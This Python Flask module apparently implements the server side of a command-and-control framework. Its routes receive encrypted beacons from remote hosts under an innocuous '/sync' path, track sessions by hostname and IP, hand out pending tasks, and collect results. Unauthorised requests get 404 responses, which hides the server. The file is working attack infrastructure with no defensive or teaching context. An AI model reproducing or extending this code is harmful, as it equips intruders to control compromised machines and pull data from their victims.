from flask import request, jsonify, abort
import secrets
from datetime import datetime
from functools import wraps
from .database import create_session, update_session, get_pending_tasks, store_results

def require_auth(config):
    def decorator(f):
        @wraps(f)
        def wrapped(*args, **kwargs):
            if not config['authentication']['require_auth']:
                return f(*args, **kwargs)
            auth_header = request.headers.get('Authorization')
            expected = f"Bearer {config['authentication']['auth_token']}"
            if auth_header != expected:
                abort(404)
            return f(*args, **kwargs)
        return wrapped
    return decorator

def register_routes(app, config, db_path, encryption_handler, logger):
    auth = require_auth(config)

    @app.route('/api/v1/sync', methods=['POST'])
    @auth
    def beacon():
        try:
            encrypted = request.json.get('data')
            if not encrypted:
                return jsonify({'status': 'error'}), 400
            payload = encryption_handler.decrypt(encrypted)
            if not payload:
                return jsonify({'status': 'error'}), 400
            session_id = payload.get('session_id')
            if not session_id:
                session_id = secrets.token_hex(16)
                create_session(db_path, session_id, payload, request.remote_addr)
            else:
                update_session(db_path, session_id, request.remote_addr)
            tasks = get_pending_tasks(db_path, session_id)
            response_data = {
                'session_id': session_id,
                'tasks': tasks,
                'timestamp': datetime.now().isoformat()
            }
            encrypted_response = encryption_handler.encrypt(response_data)
            logger.info(f"Beacon from {session_id} ({payload.get('hostname')})")
            return jsonify({'status': 'success', 'data': encrypted_response})
        except Exception as e:
            logger.error(f"Beacon error: {e}")
            return jsonify({'status': 'error'}), 500

    @app.route('/api/v1/results', methods=['POST'])
    @auth
    def submit_results():
        try:
            encrypted = request.json.get('data')
            if not encrypted:
                return jsonify({'status': 'error'}), 400
            payload = encryption_handler.decrypt(encrypted)
            if not payload:
                return jsonify({'status': 'error'}), 400
            store_results(db_path, payload)
            logger.info(f"Results from {payload.get('session_id')}")
            return jsonify({'status': 'success'})
        except Exception as e:
            logger.error(f"Results error: {e}")
            return jsonify({'status': 'error'}), 500

    @app.route('/health', methods=['GET'])
    def health_check():
        return jsonify({
            'status': 'healthy',
            'version': '1.0.0',
            'timestamp': datetime.now().isoformat()
        })

    @app.errorhandler(404)
    def not_found(error):
        return jsonify({'error': 'Not found'}), 404